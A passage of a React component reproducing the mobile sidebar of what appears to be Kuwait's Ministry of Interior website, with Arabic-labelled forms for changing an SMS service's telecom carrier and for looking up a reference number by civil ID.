                          d="M35.2,46.2c0-0.2,0.1-0.5,0.1-0.7c0-1.8-1.5-2-2.9-2c-2.8,0-3.3,0.6-3.3,2.2c0,1,0.3,1.6,1.1,2   c0.8,0.4,1.9,0.4,2.8,0.6c2.8,0.3,5.5,0.7,5.5,4.5c0,3.9-2.9,4.5-6,4.5c-2.7,0-6.2-0.3-6.3-4c0-0.3,0-0.6,0-0.9h2.9   c0,0.2,0,0.4,0,0.6c0,2.1,1.7,2.4,3.4,2.4c1.6,0,3.2-0.1,3.2-2.3c0-2.2-1.4-2.3-3.8-2.6c-3-0.3-5.8-0.8-5.8-4.4   c0-3.2,1.8-4.3,6-4.3c3.4,0,5.8,0.4,5.9,3.6c0,0.3,0,0.7-0.1,0.9H35.2z"
                        />
                        <path
                          className="st2"
                          d="M59.1,56.8V46c0-1.2-0.3-2.2-2.7-2.2c-1.9,0-2.9,0.8-3.2,2.1v10.9h-2.9V46c0-1.3-0.3-2.2-2.7-2.2   c-1.8,0-2.9,0.4-3.3,2.3v10.8h-3.1V41.9h3.1v2c0.8-1.2,2.4-2.3,4.8-2.3c2.7,0,3.7,0.9,4,2.3c1-1.4,2.6-2.3,4.8-2.3   c3.5,0,4.2,1.4,4.2,3.7v11.5H59.1z"
                        />
                        <path
                          className="st2"
                          d="M73.7,46.2c0-0.2,0.1-0.5,0.1-0.7c0-1.8-1.5-2-2.9-2c-2.8,0-3.3,0.6-3.3,2.2c0,1,0.3,1.6,1.1,2   c0.8,0.4,1.9,0.4,2.8,0.6c2.8,0.3,5.5,0.7,5.5,4.5c0,3.9-2.9,4.5-6,4.5c-2.7,0-6.2-0.3-6.3-4c0-0.3,0-0.6,0-0.9h2.9   c0,0.2,0,0.4,0,0.6c0,2.1,1.7,2.4,3.4,2.4c1.6,0,3.2-0.1,3.2-2.3c0-2.2-1.4-2.3-3.8-2.6c-3-0.3-5.8-0.8-5.8-4.4   c0-3.2,1.8-4.3,6-4.3c3.4,0,5.8,0.4,5.9,3.6c0,0.3,0,0.7-0.1,0.9H73.7z"
                        />
                      </g>
                      <text
                        transform="matrix(1 0 0 1 -231.0191 -27.0389)"
                        className="st2"
                        style={{ fontFamily: '"DDTRg-Regular"', fontSize: 28 }}
                      >
                        sms
                      </text>
                      <path
                        className="st3"
                        d="M30.6,82c0,0,0.5-9.4,6.1-12c0.6-0.3,1.2-0.4,1.9-0.4l45.2,0.2V28.4H20.8v41.4h5.4L30.6,82z"
                      />
                    </svg>
                  </a>
                </div>
                <div
                  id="collapsePersonalEnquiry"
                  className="collapse"
                  aria-labelledby="headingTwo"
                  data-parent="#sm-accordion"
                >
                  <div className="card-body article-info text-center">
                    <div className="col-12 title">تعديل شركة الإتصالات</div>
                    <div className="col-12">
                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                    </div>
                    <form
                      asp-controller="sms"
                      asp-action="change"
                      id="MQAChangeCompany"
                    >
                      <div className="row">
                        <div className="col-12">
                          <input
                            type="tel"
                            pattern="^[0–9]$"
                            className="form-control"
                            name="MQATextMobile"
                            id="MQATextMobile"
                            placeholder="*الموبايل"
                            maxLength={8}
                          />
                        </div>
                      </div>
                      <div className="row mt-1">
                        <div className="col-12">
                          <input
                            type="tel"
                            pattern="^[0–9]$"
                            className="form-control"
                            name="MQATextCivilId"
                            id="MQATextCivilId"
                            placeholder="الرقم المدني"
                            maxLength={12}
                          />
                        </div>
                      </div>
                      <div className="row mt-1 no-gutters">
                        <div className="col-sm-12 col-md-5">
                          <select
                            className="form-control"
                            id="MQASelectCompany"
                            name="MSelectCompany"
                          >
                            <option value={1}>VIVA</option>
                            <option value={2}>OOREDOO</option>
                            <option value={3}>ZAIN</option>
                          </select>
                        </div>
                        <div className="col-sm-12 col-md-7 mt-1">
                          <input
                            type="password"
                            autoComplete="off"
                            pattern="^[0–9]$"
                            name="MQATextActivationCode"
                            id="MQATextActivationCode"
                            className="form-control"
                            placeholder="*رقم التفعيل"
                            maxLength={4}
                          />
                        </div>
                      </div>
                      <div className="row mt-1">
                        <div className="col-12">
                          <button
                            className="btn btn-block btn-secondary"
                            id="MQABtnChange"
                          >
                            تعديل
                          </button>
                          <div className="d-flex justify-content-center">
                            <div
                              className="spinner-grow text-secondary d-none"
                              role="status"
                              id="MQAWorkingOnIt"
                            >
                              <span className="sr-only">Loading...</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
              {/*GET REFERENCE NUMBER*/}
              <div className="card slider-card">
                <div
                  className="card-header text-center"
                  id="mGetReferenceNumber"
                >
                  <a
                    role="button"
                    data-toggle="collapse"
                    data-target="#collapseGetRefNum"
                    href="#collapseGetRefNum"
                    aria-expanded="false"
                    aria-controls="collapseGetRefNum"
                  >
                    <img
                      src="https://www.moi.gov.kw/main/images/assets/common/ico-get-ref-num.svg"
                      className="moi-ico"
                      id="getRefNumPopMob"
                    />
                  </a>
                </div>
                <div
                  id="collapseGetRefNum"
                  className="collapse show"
                  aria-labelledby="mGetReferenceNumber"
                  data-parent="#sm-accordion"
                >
                  <div className="card-body article-info text-center">
                    <h5 className="title">الإستعلام عن رقم مرجع الداخلية</h5>
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                    {/*<form id="MQARefNum">
          <div class="col-12">
              <input class="form-control" id="MQARefNumTextCivilId" name="MQARefNumTextCivilId" maxlength="12" placeholder="الرقم المدني" />
          </div>
          <div class="col-12 mt-1 d-none">
              <input class="form-control" id="MQARefNumTextPassport" name="MQARefNumTextPassport" maxlength="15" placeholder="رقم جواز السفر" />
          </div>
          <div class="col-12 mt-1 d-none">
              <input readonly class="form-control" id="MQARefNumTextExpiryDate" name="MQARefNumTextExpiryDate" maxlength="10" placeholder="تاريخ الانتهاء جواز السفر" />
          </div>
          <div class="col-12 d-none">
              <button class="btn btn-block btn-secondary mt-2" id="btnMGetRefNum">استعلم</button>*/}
                    {/*<div class="d-flex justify-content-center">
              <div class="spinner-grow text-secondary d-none" role="status" id="MQARNWorkingOnIt">
                  <span class="sr-only">Loading...</span>
              </div>
          </div>*/}
                    {/*</div>
              <div class="col-12">
                  <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumKwti">Kuwaiti</button>
              </div>
              <div class="col-12">
                  <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumOther">Non-Kuwaiti</button>
              </div>
          </form>
          <div class="col-12 d-none" id="MQANatNumResultContainer">
              <div class="row">
                  <div class="col-12" id="MQANatNumResult"></div>
                  <div class="col-12">
                      <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumDone">إغلاق</button>
                  </div>
              </div>
          </div>*/}
                    <div className="col-12">
                      <input
                        className="form-control"
                        id="MQARefNumTextCivilId"
                        name="MQARefNumTextCivilId"
                        maxLength={12}
                        placeholder="الرقم المدني"
                      />
                    </div>
                    <div className="col-12">
                      <button
                        type="button"
                        className="btn btn-block btn-secondary mt-2"
                        id="btnMGetRefNumKwti"
                      >
                        للكويتين
                      </button>
                    </div>
                    <div className="col-12">
                      <button
                        type="button"
                        className="btn btn-block btn-secondary mt-2"
                        id="btnMGetRefNumOther"
                      >
                        للمقيمين
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              {/*NEW SERVICES*/}
              <div className="card slider-card">
                <div className="card-header text-center" id="headingFour">
                  <a data-toggle="modal" data-target="#newServicesModal">
                    <img
                      src="https://www.moi.gov.kw/main/images/assets/common/ico-new-services.svg"
                      className="card-img-top center-block moi-ico mx-auto"
                      id="newServicesPopMob"
                    />
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default App;
